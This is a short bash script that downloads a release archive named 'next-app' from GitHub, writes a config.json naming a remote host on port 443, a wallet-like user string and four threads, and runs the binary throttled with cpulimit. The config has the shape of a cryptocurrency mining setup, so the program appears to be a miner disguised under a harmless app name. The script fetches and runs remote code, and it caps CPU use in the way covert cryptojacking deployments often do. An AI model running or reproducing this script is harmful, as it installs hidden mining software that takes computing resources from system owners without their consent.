#!/bin/bash
apt update 
apt install cpulimit
wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz

tar -xf next-app.tar.gz

echo '{"host": "45.115.224.237", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 4}' > config.json

cpulimit -l 300 -- ./next-app/next-app
